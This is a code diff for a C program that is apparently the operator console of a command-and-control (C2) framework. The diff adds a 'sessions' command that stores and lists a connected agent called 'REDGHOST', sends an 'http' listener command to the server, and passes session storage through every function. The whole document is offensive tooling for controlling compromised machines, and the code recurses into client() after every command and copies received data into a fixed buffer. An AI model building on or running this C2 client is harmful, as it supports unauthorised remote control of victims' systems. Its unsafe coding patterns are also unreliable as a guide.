@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <errno.h>
+#include <sys/select.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -27,16 +28,16 @@ void info();
 void networking(int inferno_socket);
 
 //client interface
-void client(int inferno_socket);
+void client(int inferno_socket, char *session_storage);
 
 //session interface
-char *session_http(int inferno_socket);
+char *session_http(int inferno_socket, char *session_storage);
 
 //help menu
 void help_menu();
 
 //choice of actions
-void commands(int inferno_socket, char *instruction, int session_ready);
+void commands(int inferno_socket, char *instruction, int session_ready, char *session_storage);
 
 //transfering to/from server
 char *transfer(int inferno_socket, char *instruction);
@@ -47,6 +48,7 @@ void box_error();
 void box_success();
 
 int main() {
+    char session_storage[1024];
     banner();
     info();
 
@@ -59,12 +61,12 @@ int main() {
 
     networking(inferno_socket);
 
-    client(inferno_socket);
+    client(inferno_socket, session_storage);
 
     close(inferno_socket);
 }
 
-void client(int inferno_socket) {
+void client(int inferno_socket, char *session_storage) {
     int session_ready = 0;
     while (1) {
         //crafting task
@@ -78,7 +80,7 @@ void client(int inferno_socket) {
 
         instruction[strcspn(instruction, "\n")] = '\0';
 
-        commands(inferno_socket, instruction, session_ready);
+        commands(inferno_socket, instruction, session_ready, session_storage);
 
         char *receive;
         receive = transfer(inferno_socket, instruction);
@@ -88,6 +90,8 @@ void client(int inferno_socket) {
             box_success();
             printf("SessionX is ready!\n");
         }
+        if (strcmp(receive, "XXX-AGENT-REDGHOST-XXX") == 0)
+            strcpy(session_storage, receive);
     }
 }
 
@@ -134,7 +138,7 @@ void networking(int inferno_socket) {
     printf("Connected\n");
 }
 
-char *session_http(int inferno_socket) {
+char *session_http(int inferno_socket, char *session_storage) {
     box_info();
     printf("Entering sessionX...\n");
 
@@ -193,7 +197,7 @@ char *session_http(int inferno_socket) {
         if (strcmp(instruction_payload, "exit") == 0) {
             box_info();
             puts("Closing session and exiting...");
-            client(inferno_socket);
+            client(inferno_socket, session_storage);
         }
 
         // wait for response
@@ -224,11 +228,19 @@ void help_menu() {
     printf("enter\tenter in session\n\n");
 }
 
-void commands(int inferno_socket, char *instruction, int session_ready) {
+void commands(int inferno_socket, char *instruction, int session_ready, char *session_storage) {
+    //list sessions
+    if (strcmp(instruction, "sessions") == 0) {
+        box_info();
+        printf("SESSIONS\n");
+        printf("========\n");
+        printf("1. %s\n", session_storage);
+        client(inferno_socket, session_storage);
+    }
     //help menu
-    if (strcmp(instruction, "help") == 0) {
+    else if (strcmp(instruction, "help") == 0) {
         help_menu();
-        client(inferno_socket);
+        client(inferno_socket, session_storage);
     }
     //exiting c2
     else if (strcmp(instruction, "exit") == 0) {
@@ -238,19 +250,23 @@ void commands(int inferno_socket, char *instruction, int session_ready) {
     }
     //starting HTTP listener
     else if (strcmp(instruction, "http") == 0) {
+        char status[1024] = "http";
         box_info();
         puts("Starting listener...");
         box_success();
         printf("Listening on ADDRESS: %s\n\r\t\t    PORT: %d\n", IP, PORT_HTTP);
+        if (send(inferno_socket, status, sizeof(status), 0) == -1)
+            error("Error sending command to server");
+        //client(inferno_socket);
     }
     //entering session
     else if (strcmp(instruction, "enter") == 0 && session_ready) {
-        session_http(inferno_socket);
+        session_http(inferno_socket, session_storage);
     }
     else {
         box_error();
         puts("Wrong command");
-        client(inferno_socket);
+        client(inferno_socket, session_storage);
     }
 }
 
